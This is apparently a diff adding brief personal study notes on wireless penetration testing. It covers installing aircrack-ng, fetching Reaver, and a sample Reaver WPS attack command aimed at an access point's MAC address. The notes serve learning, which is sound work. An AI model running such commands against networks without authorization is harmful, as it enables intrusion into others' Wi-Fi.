@@ -1,0 +1,22 @@
+PenTesting / Ethical Hacking Notes: 
+
+- TOPIC: Wireless Hacking with Reaver and Aircrack
+
+1. you can download aircrack with: 
+"yum install aircrack-ng -y"
+remember that -y will say yes to any prompts
+
+2. to get reaver you will need to go to google code: 
+https://code.google.com/archive/p/reaver-wps/downloads
+Just grab latest 
+This is also installed on Kali
+
+3. Example REaver command: 
+-i interface 
+-b MAC address of the endpoint
+-vv verbose logging 
+
+reaver -i mon0 -b 00:90:4C:C1:AC:21 -vv -K 1
+
+
+start with chapt 11 tomorrow
